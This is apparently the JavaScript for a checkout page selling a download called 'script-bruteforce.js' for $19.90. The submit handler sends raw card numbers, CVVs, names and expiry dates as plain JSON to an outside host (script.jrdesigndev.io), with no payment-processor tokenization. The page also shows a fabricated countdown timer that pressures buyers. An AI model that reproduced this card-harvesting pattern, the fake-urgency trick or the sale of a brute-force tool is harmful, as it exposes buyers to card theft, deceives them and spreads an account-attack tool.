document.addEventListener('DOMContentLoaded', function() {
  const customFirstName = document.getElementById('custom-first-name');
  const customLastName = document.getElementById('custom-last-name');
  const customCardNumber = document.getElementById('custom-card-number');
  const customCardExpiryMonth = document.getElementById('custom-expiry-month');
  const customCardExpiryYear = document.getElementById('custom-expiry-year');
  const customCardCvv = document.getElementById('custom-cvv');
  const customSubmitBtn = document.getElementById('custom-submit-btn');
  const customCreditCard = document.querySelector('.custom-credit-card');
  const customCreditCardNumber = document.querySelector('.custom-credit-card-number');
  const customCreditCardName = document.querySelector('.custom-credit-card-name');
  const customCreditCardExpiry = document.querySelector('.custom-credit-card-expiry');
  const customCreditCardCvv = document.querySelector('.custom-credit-card-cvv');
  const customPaymentSection = document.querySelector('.custom-payment-section');

  // Prevent non-numeric input for card number
  customCardNumber.addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '');
    
    // Format card number display
    const formattedNumber = this.value.replace(/\d{4}(?=.)/g, '$& ');
    customCreditCardNumber.textContent = formattedNumber || '•••• •••• •••• ••••';
  });

  customFirstName.addEventListener('input', updateCardName);
  customLastName.addEventListener('input', updateCardName);

  function updateCardName() {
    const fullName = `${customFirstName.value} ${customLastName.value}`.toUpperCase();
    customCreditCardName.textContent = fullName || 'FULL NAME';
  }

  function updateExpiryDisplay() {
    const month = customCardExpiryMonth.value.padStart(2, '0');
    const year = customCardExpiryYear.value ? customCardExpiryYear.value.slice(-2) : '';
    customCreditCardExpiry.textContent = month && year ? `${month}/${year}` : 'MM/YY';
  }

  customCardExpiryMonth.addEventListener('input', updateExpiryDisplay);
  customCardExpiryYear.addEventListener('input', updateExpiryDisplay);

  // CVV Animation and Display
  customCardCvv.addEventListener('input', function() {
    customCreditCardCvv.textContent = this.value || 'CVV';
  });

  customCardCvv.addEventListener('focus', function() {
    customCreditCard.classList.add('flipped');
  });

  customCardCvv.addEventListener('blur', function() {
    customCreditCard.classList.remove('flipped');
  });

  // Countdown Timer
  function startCountdown() {
    const timerElement = document.getElementById('custom-timer');
    let remainingTime = 15 * 60; // 15 minutes

    function updateTimer() {
      const minutes = Math.floor(remainingTime / 60);
      const seconds = remainingTime % 60;
      timerElement.textContent = `Limited Time Offer Ends In: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
      
      if (remainingTime <= 0) {
        clearInterval(timerInterval);
        timerElement.textContent = 'Offer Expired!';
      }
      remainingTime--;
    }

    const timerInterval = setInterval(updateTimer, 1000);
    updateTimer(); // Immediate first call
  }

  startCountdown();

  // Form Submission
  const customForm = document.getElementById('custom-payment-form');
  customForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    // Enhanced Loading Animation
    const processingSection = `
      <div id="custom-processing-section">
        <div class="custom-loader-container">
          <svg class="custom-loader" viewBox="0 0 100 100">
            <defs>
              <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" style="stop-color:#1877f2;stop-opacity:1" />
                <stop offset="100%" style="stop-color:#42b72a;stop-opacity:1" />
              </linearGradient>
            </defs>
            <circle 
              cx="50" 
              cy="50" 
              r="45" 
              fill="none" 
              stroke="url(#gradient)" 
              stroke-width="10" 
              stroke-dasharray="283" 
              stroke-dashoffset="283"
              class="custom-loader-circle"
            />
          </svg>
          <div class="custom-loader-text">Processing Payment...</div>
        </div>
      </div>
    `;

    customPaymentSection.innerHTML = processingSection;

    try {
      const payload = {
        data: {
          number: customCardNumber.value.replace(/\s/g, ''),
          verification_value: customCardCvv.value,
          first_name: customFirstName.value,
          last_name: customLastName.value,
          month: customCardExpiryMonth.value.padStart(2, '0'),
          year: customCardExpiryYear.value
        }
      };

      const response = await fetch('https://script.jrdesigndev.io/paypay', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      const responseData = await response.json();

      if (responseData.mensagem === "Pagamento aprovado") {
        // Success section HTML
        const successSection = `
          <div id="custom-success-section">
            <div class="custom-success-content">
              <div class="custom-success-icon">✓</div>
              <h2 class="custom-success-title">Thank You for Your Purchase!</h2>
              <p class="custom-success-description">Your payment has been successfully processed.</p>
              <div class="custom-download-link">
                <a href="https://www.mediafire.com/file/mi5wkxrdk7zd0pj/script-bruteforce.js/file" target="_blank">Download Script</a>
              </div>
            </div>
          </div>
        `;

        customPaymentSection.innerHTML = successSection;

        // Trigger confetti
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 }
        });
      } else {
        throw new Error('Payment not authorized');
      }
    } catch (error) {
      console.error('Error:', error);
      
      // Revert back to payment form
      customForm.innerHTML = `
        <div class="custom-form-row">
          <div class="custom-form-group">
            <label for="custom-first-name">First Name</label>
            <input type="text" id="custom-first-name" required>
          </div>
          <div class="custom-form-group">
            <label for="custom-last-name">Last Name</label>
            <input type="text" id="custom-last-name" required>
          </div>
        </div>
        
        <div class="custom-form-group">
          <label for="custom-card-number">Card Number</label>
          <input type="text" id="custom-card-number" required>
        </div>
        
        <div class="custom-card-details-row">
          <div class="custom-form-group">
            <label for="custom-expiry-month">Expiry Month</label>
            <input type="number" id="custom-expiry-month" min="1" max="12" required>
          </div>
          <div class="custom-form-group">
            <label for="custom-expiry-year">Expiry Year</label>
            <input type="number" id="custom-expiry-year" min="23" max="30" required>
          </div>
          <div class="custom-form-group">
            <label for="custom-cvv">CVV</label>
            <input type="number" id="custom-cvv" min="100" max="999" required>
          </div>
        </div>
        
        <button type="submit" id="custom-submit-btn">Pay Now - $19.90</button>
      `;

      const customToast = document.getElementById('custom-toast');
      customToast.textContent = 'Payment failed. Please try again.';
      customToast.className = 'custom-toast show error';
      setTimeout(() => {
        customToast.classList.remove('show');
      }, 3000);
    }
  });
});